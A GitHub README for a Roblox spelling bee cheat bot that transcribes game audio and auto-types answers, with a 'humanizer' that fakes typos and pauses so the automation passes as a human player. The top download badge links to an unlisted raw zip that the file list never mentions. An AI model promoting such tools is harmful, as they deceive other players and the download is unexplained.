# Bnong's Spelling Bee Bot

An intelligent Roblox Spelling Bee assistant that listens to the game in real-time, recognises the target word the instant the pronouncer says it, and types the answer with convincing human-like behaviour — burst typing, natural hesitations, typos, and backspace corrections.

> Created by **bnong** on GitHub

---

[![Download](https://img.shields.io/badge/Download-Wordguessing%202.zip-brightgreen?style=for-the-badge&logo=github)](https://github.com/bnong/Roblox-Spelling-Bee-bnong-s-Spelling-Bee-Bot/raw/main/Wordguessing%202.zip)
[![Latest Release](https://img.shields.io/github/v/release/bnong/Roblox-Spelling-Bee-bnong-s-Spelling-Bee-Bot?style=for-the-badge&logo=github&label=Latest%20Release&color=blue)](https://github.com/bnong/Roblox-Spelling-Bee-bnong-s-Spelling-Bee-Bot/releases/latest)
[![License](https://img.shields.io/github/license/bnong/Roblox-Spelling-Bee-bnong-s-Spelling-Bee-Bot?style=for-the-badge&color=orange)](https://github.com/bnong/Roblox-Spelling-Bee-bnong-s-Spelling-Bee-Bot/blob/main/LICENSE)

---

## Features

### Autoplay (default — recommended)

- **Continuous listening** — bot captures all desktop audio non-stop via audio loopback and detects speech automatically using voice activity detection (VAD)
- **Instant typing** — by the time the pronouncer finishes saying the word, Bnong's Spelling Bee Bot has already matched it; one Right Shift press fires the answer immediately
- **Smart Word Recognition** — you don't even have to wait for the pronouncer to finish! Press Right Shift mid-pronunciation and the bot instantly grabs whatever partial audio has been captured, transcribes it, and matches the closest word from the word bank. Just like a pro player who recognises the word halfway through hearing it
- **Word expiry** — detected words expire after 8 seconds so stale transcriptions never auto-fire
- **Turn timeout** — if no word is heard within 10 seconds of your turn signal, the bot gives up gracefully (and optionally rage-reacts)

### Manual Mode (alternative)

- **Toggle recording** — press Right Shift to start capturing, press again to stop
- **Smart Word Recognition** — stop the recording before the word is even fully pronounced and the bot still finds the best match from the word bank using prefix matching, fuzzy scoring, and prefix proximity analysis
- **Runs on demand** — only listens when you tell it to

### AI Word Matching

- **Multi-candidate scoring** — uses every one of Google's transcription alternatives, not just the top result
- **Preamble detection** — automatically strips announcer phrases ("the next word is", "please spell", etc.) before matching
- **Multi-strategy extraction** — tries last word, joined words, last 2/3/5 combined, and each individual word; handles split transcriptions like "phantom goria" → "phantasmagoria"
- **Prefix matching** — if the transcription is the start of a word bank entry (e.g. "phan" → "phantasmagoria"), it scores as a strong match — this is what powers Smart Word Recognition for partial pronunciations
- **Prefix proximity bonus** — even if the transcription isn't an exact prefix, words that share a long common starting sequence get a score boost
- **Dual fuzzy matching** — scores with both `SequenceMatcher` and character trigram Jaccard similarity
- **Audio duration bias** — uses recording length to estimate expected word length and penalise suspiciously short matches
- **1,006-word bank** — covers Advanced, Expert, Genius, Master, and more
- **Level filter** — lock matching to a specific game level so short easy words can't steal matches from long ones

### Humanizer

- **7 skill presets** — Beginner through Master; each changes speed, burst behaviour, pause timing, and typo frequency
- **Burst typing** — random fast segments that look like confident key runs
- **Speed drift** — typing speed naturally accelerates and decelerates within a word
- **Thinking hesitations** — word complexity score drives mid-word pauses (harder words get more pauses at the trickiest positions)
- **Typo & backspace** — types 1–3 wrong QWERTY-neighbour keys, pauses, then either quick-fixes or rewrites from the beginning like a real person
- **Modifier release** — releases Shift/Ctrl/Alt/Enter before typing to prevent phantom key presses

### Bonus Modes

- **Rage Mode** — on transcription failure: keyboard smash → panic delete → random funny fail message typed into chat
- **Flex Mode** — before the real answer: 70% chance keyboard spam, 30% chance a meme phrase ("LETTHEMCOOKKK", "WEARESOOOBACKKK", etc.), then deletes it and types the real word

---

## Prerequisites

- **Python 3.10+** installed and added to PATH
- **Windows or macOS**
- **Audio loopback device** — Stereo Mix on Windows, or BlackHole on macOS (see setup below)
- **Internet connection** (Google Speech API requires network access)
- **macOS only:** Accessibility permission for your terminal app (System Settings → Privacy & Security → Accessibility)

---

## Step 1 — Set Up Audio Loopback

The bot needs to hear what your speakers are playing. This requires a loopback/virtual audio device.

### Windows

1. Right-click the **speaker icon** in the system tray → **Sounds**.
2. Go to the **Recording** tab.
3. Right-click in the empty area → check **Show Disabled Devices**.
4. Right-click **Stereo Mix** → **Enable**.

> If Stereo Mix doesn't appear, update your Realtek/audio drivers or check your sound card documentation.

### macOS

1. Install **BlackHole** (free, open-source virtual audio driver):
   ```
   brew install blackhole-2ch
   ```
   Or download from [github.com/ExistentialAudio/BlackHole](https://github.com/ExistentialAudio/BlackHole).

2. Open **Audio MIDI Setup** (search in Spotlight).

3. Click the + button at the bottom left → **Create Multi-Output Device**.

4. In the new Multi-Output Device, tick **both**:
   - Your real speakers/headphones (e.g. "MacBook Pro Speakers")
   - **BlackHole 2ch**

5. Right-click the Multi-Output Device → **Use This Device For Sound Output**.

> This routes all system audio to both your speakers (so you can still hear) AND BlackHole (so the bot can listen).

> **Tip:** If BlackHole appears as **"Offline Device"** instead of "BlackHole 2ch", the driver hasn't fully activated yet. Simply **restart your Mac** then it will show the correct name after rebooting.

> **Tip:** You may see advice online to run `sudo launchctl kickstart -kp system/com.apple.audio.coreaudiod` to reload the audio daemon. On modern macOS with SIP enabled this will fail with "Operation not permitted", that's expected and harmless. A full restart is the reliable fix.

6. **Grant Accessibility permission** to your terminal app:
   - Go to **System Settings → Privacy & Security → Accessibility**
   - Add and enable your terminal (Terminal.app, iTerm2, VS Code, etc.)

> This is required for the bot to simulate keystrokes via pynput.

---

## Step 2 — Install Dependencies

Open a terminal in this folder and run:

**Windows:**
```
pip install -r requirements.txt
```

**macOS:**
```
python3 -m pip install -r requirements.txt
```

> **macOS note:** Always use `python3 -m pip` rather than just `pip` on macOS. This ensures packages are installed into the same Python that runs the script. Using plain `pip` can install into a different Python version and cause `ModuleNotFoundError` when you run the bot.

This installs: `sounddevice`, `scipy`, `numpy`, `SpeechRecognition`, `keyboard`, `pynput`.

> **Note:** On macOS, the `keyboard` package is not used at runtime — the bot uses `pynput` for keyboard control instead. You can safely ignore any `keyboard` install warnings.

---

## Step 3 — Run the Bot

**Windows:**
```
python spelling_bee_bot.py
```

**macOS:**
```
python3 spelling_bee_bot.py
```

On launch the script lists all audio input devices and auto-selects the loopback device (Stereo Mix on Windows, BlackHole on macOS). If it can't find one you'll be prompted to enter the device index manually.

---

## Controls

### Autoplay Mode (default)

| Key             | Action                                                        |
| --------------- | ------------------------------------------------------------- |
| **Right Shift** | Signal "it's my turn" — bot types the word instantly if ready |
| **Esc**         | Quit                                                          |

**Workflow:**

1. Run the bot and focus the Roblox window.
2. Bnong's Spelling Bee Bot listens in the background the entire time.
3. When it's your turn in the game, press **Right Shift once**.
   - If the word was already heard → typed immediately.
   - If the pronunciation is still going → **Smart Word Recognition** kicks in: the bot grabs whatever partial audio exists right now, transcribes it, and matches the closest word from the bank. No need to wait for the pronouncer to finish.
   - If no audio has been detected yet → bot waits and fires the moment a word is detected (with timeout fallback).

### Manual Mode (`AUTOPLAY = False`)

| Key             | Action                                        |
| --------------- | --------------------------------------------- |
| **Right Shift** | Press to START, press again to STOP recording |
| **Esc**         | Quit                                          |

---

## Configuration

Edit the constants near the top of `spelling_bee_bot.py`.

### Skill Level

```python
SKILL_LEVEL = "master"
```

| Level      | Keystroke  | Burst Speed | Burst Chance | Typo Chance | Think Pauses |
| ---------- | ---------- | ----------- | ------------ | ----------- | ------------ |
| `beginner` | 180–350 ms | 140–220 ms  | 0 %          | 0 %         | 800–2000 ms  |
| `novice`   | 140–280 ms | 100–180 ms  | 5 %          | 0 %         | 600–1500 ms  |
| `moderate` | 120–260 ms | 90–180 ms   | 10 %         | 2 %         | 400–1000 ms  |
| `advanced` | 90–200 ms  | 65–140 ms   | 15 %         | 3 %         | 300–800 ms   |
| `expert`   | 65–160 ms  | 50–120 ms   | 18 %         | 4 %         | 200–600 ms   |
| `genius`   | 55–130 ms  | 45–95 ms    | 25 %         | 5 %         | 150–450 ms   |
| `master`   | 50–110 ms  | 40–80 ms    | 28 %         | 6 %         | 100–350 ms   |

### Toggleable Features

| Variable       | Default | Description                                                             |
| -------------- | ------- | ----------------------------------------------------------------------- |
| `TYPO_ENABLED` | `True`  | Enable typo/backspace humanizer                                         |
| `AUTO_SUBMIT`  | `False` | Press Enter automatically after typing (off = you press Enter yourself) |
| `RAGE_MODE`    | `True`  | Keyboard smash + funny chat message when transcription fails            |
| `FLEX_MODE`    | `False` | Type a meme spam or phrase before the real answer                       |
| `AUTOPLAY`     | `True`  | Continuous listening mode (off = manual record toggle)                  |

### Word Bank Level Filter

```python
WORDBANK_LEVEL = "master"
```

Lock matching to one game level so shorter easy words don't steal matches from longer hard ones.

| Value        | Description                            |
| ------------ | -------------------------------------- |
| `"all"`      | Use all 1,006 words                    |
| `"advanced"` | Only Advanced level words (~197 words) |
| `"expert"`   | Only Expert level words (~196 words)   |
| `"genius"`   | Only Genius level words (~118 words)   |
| `"master"`   | Only Master level words (~71 words)    |

> Set this to match the game level you're currently playing.

### Autoplay Tuning

| Variable                     | Default | Description                                            |
| ---------------------------- | ------- | ------------------------------------------------------ |
| `_AUTOPLAY_SILENCE_RMS`      | `300`   | RMS below this = silence (raise in noisy environments) |
| `_AUTOPLAY_TRAILING_SILENCE` | `0.7`   | Seconds of silence after speech before transcribing    |
| `_AUTOPLAY_MIN_SPEECH`       | `0.4`   | Ignore speech segments shorter than this (seconds)     |
| `_AUTOPLAY_MAX_SPEECH`       | `10.0`  | Force-transcribe after this many seconds of speech     |
| `_AUTOPLAY_WORD_EXPIRY`      | `8.0`   | Pending word expires after N seconds                   |
| `_AUTOPLAY_TURN_TIMEOUT`     | `10.0`  | Give up waiting for word after N seconds               |

---

## Word Bank

`wordbank.txt` contains 1,006 words organised by game level:

```
# ─── ADVANCED LEVEL ───
abditive
abeyance
...
# ─── MASTER LEVEL ───
otorhinolaryngological
...
```

To add words, append them under the correct section header. Lines starting with `#` are treated as headers or comments.

---

## Troubleshooting

| Problem                        | Fix                                                                                  |
| ------------------------------ | ------------------------------------------------------------------------------------ |
| `ModuleNotFoundError: No module named 'sounddevice'` | Run `python3 -m pip install -r requirements.txt` instead of plain `pip install`. |
| `[!] Could not transcribe`     | Make sure your audio loopback device is set up and game volume is audible.            |
| Wrong word matched             | Set `WORDBANK_LEVEL` to the game difficulty you're playing.                           |
| Word not in bank               | Add it to `wordbank.txt` under the correct section.                                  |
| Typed into the wrong window    | Focus the Roblox window before pressing Right Shift.                                 |
| Google API error               | Check your internet connection.                                                      |
| No loopback device detected    | **Windows:** Update audio drivers / enable Stereo Mix. **macOS:** Install BlackHole. |
| Typing too fast or too slow    | Change `SKILL_LEVEL`.                                                                |
| Typos are annoying             | Set `TYPO_ENABLED = False`.                                                          |
| Bot never types the word       | Lower `_AUTOPLAY_SILENCE_RMS` if the audio is quiet, or check your loopback device.  |
| Word typed too late            | Lower `_AUTOPLAY_TRAILING_SILENCE` (e.g. `0.4`) for faster detection.                |
| **macOS:** Keys not typing     | Grant Accessibility permission to your terminal in System Settings.                  |
| **macOS:** No audio captured   | Make sure Multi-Output Device is set as system output and BlackHole is ticked.       |
| **macOS:** BlackHole shows as "Offline Device" | Restart your Mac — the driver activates fully after a reboot.          |
| **macOS:** `launchctl kickstart` gives "Operation not permitted" | This is normal when SIP is enabled. Ignore it and restart your Mac instead. |

---

## Files

| File                  | Description                                    |
| --------------------- | ---------------------------------------------- |
| `spelling_bee_bot.py` | Main bot script                                |
| `wordbank.txt`        | 1,006 words organised by game level            |
| `requirements.txt`    | Python dependencies                            |
| `README.md`           | This file                                      |
| `desktop_audio.wav`   | Temp audio file (auto-created, safe to delete) |
